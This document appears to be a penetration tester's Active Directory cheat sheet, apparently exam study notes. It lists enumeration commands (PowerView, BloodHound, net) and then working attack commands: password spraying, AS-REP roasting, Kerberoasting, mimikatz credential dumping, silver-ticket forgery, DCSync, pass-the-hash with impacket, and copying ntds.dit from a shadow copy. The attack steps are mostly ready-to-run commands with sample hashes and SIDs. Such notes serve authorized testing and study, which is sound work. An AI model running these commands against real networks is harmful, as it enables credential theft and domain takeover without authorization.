# Enumeration

## Some tips:
In order to execute some powershell scripts:
```
powershell -ep bypass
```

About users (script for getting users)

## Manual

Windapsearch form anonymous binds:
```
./windapsearch.py -d domain.com --dc-ip $rhost -U
```

### Enumerate Users
```
impacket-GetADUsers domain.com -dc-ip $rhost -debug
```

[Username anarchy - Tool for generating usernames when pentesting.](https://github.com/urbanadventurer/username-anarchy)

If you have only users, you should try **AS-REP Roasting**.

#### Enumerate Local Accounts on the machine:
```
net user /domain
```

#### Checking admin account:
```
net user admin /domain
```

#### Enumerate roups:
```
net group /domain
```

Get information about Sales Department
```
net group "Sales Department" /domain
```

### Operating System

#### PowerView:
```
Get-NetComputer
```

### Permissions and Logged on Users

#### PowerView:
```
Find-LocalAdminAccess
```

#### PowerView:
```
Get-NetSession -ComputerName computer_name -Verbose
```

### Enumeration Through Service Principal Names

#### cmd:
```
setspn -L user
```

#### PowerView:
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Enumerating Object Permissions

#### Permissions:
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

#### PowerView:
```
Get-ObjectAcl -Identity douglas
```

### Enumerating Domain Shares

#### PowerView:
```
Find-DomainShare
```

## Automatic

### BloodHound

Open terminal and type:
```
sudo neo4j console
```

After neo4j has been loaded, use another terminal and type:
```
bloodhound
```

#### Sharphound:
```
Invoke-BloodHound -CollectionMethod All
```

#### Analyzing Data

##### Raw Queries

###### Return Computers:
```
MATCH (m:Computer) RETURN m
```

###### Return Users:
```
MATCH (m:User) RETURN m
```

```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

# Attacking

Reference: [Wikipedia](https://en.wikipedia.org/wiki/Kerberos_%28protocol%29)
![](img/Kerberos_protocol.png)

## Password Attacks

### Password Spraying
```
crackmapexec smb 192.168.10.10 -u users.txt -p 'password123!' -d corp.com --continue-on-success
```

### Kerbrute
```
kerbrute passwordspray -d test.local domain_users.txt password123
```

## AS-REP Roasting

### impacket
```
impacket-GetNPUsers domain.com/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

### Rubeus
```
.\Rubeus.exe asreproast /nowrap
```

## Kerberoasting

### Rubeus
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
### impacket
```
impacket-GetUserSPNs -request -dc-ip 192.168.10.10. domain.com/douglas
```

## Silver Tickets

We need to collect three pieces of information:
- SPN password hash
- Domain SID
- Target SPN

Using mimikatz to extract cached AD credentials:
```
privilege::debug
```

```
sekurlsa::logonpasswords
```
From the dump presented from mimikatz, we can get the sid for our admin, the service for the silver ticket and the user

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:domain.com /ptt /target:website.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin
```

Now, confirm with `klist` that we have a service ticket

## Domain Controller Synchronization

### impacket
```
secretsdump.py domain.com/username@$rhost -just-dc-user Administrator
```

### mimikatz
```
lsadump::dcsync /domain:domina.com /user:dcsyncuser
```
# Lateral Movement

How to create a PSCredential:
```
$username = 'ken';
$password = 'password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

## Wmic and WinRM
WMI, we need credentials of a member of the Administrators local group

For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

Checking for WinRM:
```
crackmapexec winrm $ip -u user -p password
```

## PsExec
The user that authenticates to the target machine needs to be part of the Administrators local group
The ADMIN$ share must be available and File and Printer Sharing has to be turned on

```
impacket-psexec test.local/john:password123@10.10.10.1
```

## Pass the Hash

### Impacket:

#### WMI:
```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$rhost
```

#### PsExec:
```
impacket-psexec oscp.exam/administrator@192.168.130.102 -hashes :ba85f4e1f47633ebd44894de679fabb4

```

## Overpass the Hash

## Pass the Ticket

# Persistence

## Golden Ticket



## Shadow Ticket

Take a snapshot of drive C: :
```
vshadow.exe -nw -p  C:
```

Copy whe whole AD database:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Extract the content of ntds.dit and save the SYSTEM hive:
```
reg.exe save hklm\system c:\system.bak
```

Now use secretsdump
